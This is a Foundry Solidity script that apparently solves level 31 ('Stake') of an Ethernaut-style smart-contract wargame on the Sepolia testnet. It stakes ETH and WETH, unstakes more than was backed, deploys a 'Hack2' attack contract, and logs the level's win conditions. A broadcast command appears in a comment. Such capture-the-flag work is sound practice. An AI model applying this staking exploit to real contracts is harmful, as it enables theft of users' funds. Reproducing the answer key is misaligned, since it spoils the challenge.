// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Stake, IERC20, Hack2} from "../src/level31.sol";

contract Level31Script is Script {
    function run(address instanceAddress, address sender) external {
        Stake target = Stake(instanceAddress);
        IERC20 weth = IERC20(target.WETH());

        uint256 totalStakedBefore = target.totalStaked();
        uint256 userStakeBefore = target.UserStake(sender);
        uint256 contractBalanceBefore = address(target).balance;
        bool isStakerBefore = target.Stakers(sender);
        console.log("Total staked before:", totalStakedBefore);
        console.log("User stake before:", userStakeBefore);
        console.log("Contract balance before:", contractBalanceBefore);
        console.log("Is staker before:", isStakerBefore);
        console.log("Sender address:", sender);

        vm.startBroadcast(sender);
        target.StakeETH{value: 0.0011 ether}();
        weth.approve(address(target), 20 ether);
        target.StakeWETH(20 ether);
        target.Unstake(20.0011 ether);
        Hack2 attackContract2 = new Hack2(address(target));
        attackContract2.hack();
        vm.stopBroadcast();

        uint256 totalStakedAfter = target.totalStaked();
        uint256 userStakeAfter = target.UserStake(sender);
        uint256 contractBalanceAfter = address(target).balance;
        bool isStakerAfter = target.Stakers(sender);
        console.log("Total staked after:", totalStakedAfter);
        console.log("User stake after:", userStakeAfter);
        console.log("Contract balance after:", contractBalanceAfter);
        console.log("Is staker after:", isStakerAfter);
        console.log(
            "Condition 1 - Contract balance > 0:",
            contractBalanceAfter > 0
        );
        console.log(
            "Condition 2 - totalStaked > balance:",
            totalStakedAfter > contractBalanceAfter
        );
        console.log("Condition 3 - Is staker:", isStakerAfter);
        console.log("Condition 4 - User stake == 0:", userStakeAfter == 0);
        console.log(
            "All conditions met:",
            contractBalanceAfter > 0 &&
                totalStakedAfter > contractBalanceAfter &&
                isStakerAfter &&
                userStakeAfter == 0
        );
    }
}
//forge script script/level31.s.sol:Level31Script --rpc-url $SEPOLIA_RPC_URL --broadcast --account mytestkey --sig "run(address,address)" 0x6255c43C132892747AE5AA37B1f7D25C8c781acd 0x0ADf707838CDc0aBd5Cc361A9C680CEe4487F148
